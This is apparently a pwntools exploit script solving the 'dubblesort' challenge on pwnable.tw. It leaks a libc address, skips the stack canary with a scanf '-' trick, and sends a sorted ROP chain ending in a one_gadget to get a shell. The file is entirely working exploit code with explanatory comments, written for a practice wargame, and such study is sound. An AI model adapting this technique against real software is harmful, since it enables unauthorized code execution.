from pwn import *

context.clear(terminal = ['tmux', 'splitw', '-fh'])

libc = ELF('./libc_32.so.6')

size = 24
words_to_ebp = 8

#p = process('./dubblesort', env={'LD_PRELOAD':libc.path})
#p = gdb.debug('./dubblesort', gdb1, env={'LD_PRELOAD':libc.path})
p = remote('chall.pwnable.tw', 10101)

name = b'A' * 16
p.sendafter(b'name :', b'A' * 16)

leaks = p.recvuntil(b',How')[len(name) + 6 : -4]
libc.address = int.from_bytes(leaks[:4], 'little') - 0x8f82f

print(f'[+] libc leak\t\t@ {hex(libc.address)}')

# gadget offsets
pop_edi         = 0x177db
one_gadget      = 0x5f066       # need [esp] == NULL & esi = libc GOT addr which is libc.address + 0x1b0000
add_ebx_esi_5f  = 0x74a65       # add ebx, dword ptr [esi + 0x5f] ; ret         sets ebx to libc GOT address using values sent later in script
xchg_ebx_eax    = 0xf5b19       # eax = libc GOT addr, ebx = 0
xchg_esi_eax    = 0x179f55      # esi = libc GOT addr, eax = libc.address
push_edi        = 0x1a69fe      # run one_gadget in edi

payload  = p32(libc.address + pop_edi)                  # 0x177db       pop one gadget addr into edi
payload += p32(libc.address + one_gadget)               # 0x5f065
payload += p32(libc.address + add_ebx_esi_5f)           # 0x74a65
payload += p32(libc.address + xchg_ebx_eax)             # 0xf5b19
payload += p32(libc.address + xchg_esi_eax)             # 0x179f55
payload += p32(libc.address + push_edi)                 # 0x1a69fe      call one_gadget

payload_chunks = unpack_many(payload, 32, endianness='little')

# 24 = up to canary
# 32 = up to ebp
p.sendlineafter(b'sort :', str(size + words_to_ebp + len(payload_chunks)).encode())

for i in range(size):
        p.sendline(str(int(0x100000)).encode())

# stuff like "- 3", "-- 3", "--3", etc gets the minus symbol parsed and removed from input buffer, skipping the next word on the stack
# a "-" will skip word(s) on stack
# "- 3" will skip a word on the stack and then the next word after the one skipped is set to 3
# "--3" wll skip a word on the stack and the next word after it will be -3

# skips the next 8 addresses on stack starting from canary up to ebp
# skip canary
p.sendline(b'-')

# libc base addr is never < 0xe8000000
# need these next 7 numbers to be between canary value and libc base address since gadgets are all > libc base address and these values are sorted
for i in range(4):
        p.sendline(str(int(libc.address)).encode())                     # ebx = libc.address + 0x9ee = [0x1b0000]

for i in range(words_to_ebp - 5):                                       # esi, edi, ebp registers need to be some value such that ebx + register = libc GOT address
        p.sendline(str(int(libc.address + 0x9ee - 0x5f)).encode())      # sets esi to value such that the add ropgadget sets ebx to libc GOT address

for i in payload_chunks:                                                # send ropchain
        p.sendline(str(i).encode())

p.interactive()
